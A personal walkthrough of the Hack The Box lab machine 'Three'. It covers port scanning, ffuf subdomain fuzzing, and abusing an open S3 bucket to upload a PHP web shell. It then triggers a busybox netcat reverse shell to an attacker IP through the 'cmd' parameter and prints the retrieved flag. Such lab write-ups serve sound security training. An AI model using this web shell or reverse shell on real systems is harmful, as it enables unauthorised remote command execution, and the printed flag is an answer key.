- - - 
created : 31-07-2025 

Tags : #veryeasy
- - - 
# Objective

Learn how to start.
# CONNECT

To attack the target machine, you must be on the same network.  
Connect to the Starting Point VPN using one of the following options.

It may take a minute for HTB to recognize your connection.  
If you don't see an update after 2-3 minutes, refresh the page.

I will use OpenVPN, so i download the config file, go in the same directory and execute the following command :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB]
└─$ sudo openvpn starting_point_mdn0x.ovpn 
[sudo] password di mdn0x: 
```

We can start our [Vulnerable Machine](../../../../3%20-%20Tags/Hacking%20Concepts/Vulnerable%20Machine.md).

Now we add the target IP to our /etc/hosts file, so we don't have to remember the [IP address](../../../../3%20-%20Tags/Hacking%20Concepts/IP%20address.md) every time :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 0/Meow]
└─$ sudo nano /etc/hosts
```

We add a line with the given IP and a name .
# Task 1

How many TCP ports are open?
## Rustscan/Nmap

We can use [Rustscan](../../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Three]
└─$ rustscan -a three.htb -- -A -sT

Open 10.129.227.248:22
Open 10.129.227.248:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Toppers
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

The answer is `2`
# Task 2

What is the domain of the email address provided in the "Contact" section of the website?

```bash
  thetoppers.htb
```
# Task 3

In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?

```bash
  /etc/hosts
```
# Task 4

Which sub-domain is discovered during further enumeration?

First we add the new hostname to the /etc/hosts file on the same IP.
## FFuf

We can use [FFuf](../../../../3%20-%20Tags/Hacking%20Tools/FFuf.md) to search for virtual hosts [Fuzzing](../../../../3%20-%20Tags/Hacking%20Concepts/Fuzzing.md) the domain with a wordlist, to use that we set `-fs` (filter size) parameter to casual and run, we check the results :

```bash
 ┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Three]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H 'Host: FUZZ.three.htb' -u http://three.htb -fs 1 -c  

        /'___\  /'___\           /___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://three.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
 :: Header           : Host: FUZZ.three.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1
________________________________________________

000                     [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 176ms]
0                       [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 175ms]
.cvsignore              [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 175ms]
.htpasswd               [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 178ms]
0-12                    [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 178ms]
.subversion             [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 178ms]

```

Now we know `-fs` got to be set to SIZE, so `11952` in this case, we run the command again changing that :

```
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Three]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H 'Host: FUZZ.thetoppers.htb ' -u http://thetoppers.htb -fs 11952 -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://thetoppers.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 :: Header           : Host: FUZZ.thetoppers.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 11952
________________________________________________

s3.thetoppers.htb
```

We add this also to our /etc/hosts file on the same line :

```basg
 10.129.227.248 three.htb thetoppers.htb s3.thetoppers.htb  
```
# Task 5

Which service is running on the discovered sub-domain?

We can use Google to search for s3 subdomain status running :

```bash
  Amazon S3  
```
# Task 6

Which command line utility can be used to interact with the service running on the discovered sub-domain?

```bash
  awscli
```
# Task 7

Which command is used to set up the AWS CLI installation?

```bash
 aws configure
```
# Task 8

What is the command used by the above utility to list all of the S3 buckets?

```bash
 aws s3 ls
```
# Task 9

This server is configured to run files written in what web scripting language?

```bash
 php
```
# Submit root flag

First we install it :

```
sudo apt install awscli             
```

Now we configure and use it with the `--endpoint` flag : 

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Three]
└─$ aws configure                                
AWS Access Key ID [None]: flag
AWS Secret Access Key [None]: flag
Default region name [None]: flag
Default output format [None]: flag
                         
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Three]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls
2025-07-31 20:29:05 thetoppers.htb
```

Further, let’s write the s3 expression in the form of a protocol like http `s3://thetoppers.htb` and examine what is in the bucket :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Three]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2025-07-31 20:29:05          0 .htaccess
2025-07-31 20:29:05      11952 index.php
```
## Exploit

### Scripting (PHP)

Let’s write a simple php shell command. Here, we will be able to obtain the command line using the “**system()**” function by using the operating system function :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Three]
└─$ nano script.php           

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Three]
└─$ cat script.php 
<?php system($_GET["cmd"]); ?>
```

Now we copy that on the target machine with the following command :

```bash                               
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Three]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 cp script.php s3://thetoppers.htb 
upload: ./script.php to s3://thetoppers.htb/script.php            
```
### Foothold

Now going on the URL we have command injection :

![Pasted image 20250731212905.png](../../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250731212905.png)

We can copy a [Reverse Shell](../../../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) from https://www.revshells.com/ :

```
 busybox nc 10.10.14.231 1337 -e sh
```

We open the listener on the same port with [Netcat](../../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Three]
└─$ nc -lvnp 1337  
listening on [any] 1337 ...
```

And we paste the shell in the cmd parameter :

```nash
 http://thetoppers.htb/script.php?cmd=busybox%20nc%2010.10.14.231%201337%20-e%20sh
```

We check the listener and retrieve the flag :

```
listening on [any] 1337 ...
connect to [10.10.14.231] from (UNKNOWN) [10.129.227.248] 39036
whoami
www-data

cd ..

cat flag.txt
a980d99281a28d638ac68b9bf9453c2b
```

Pwned !!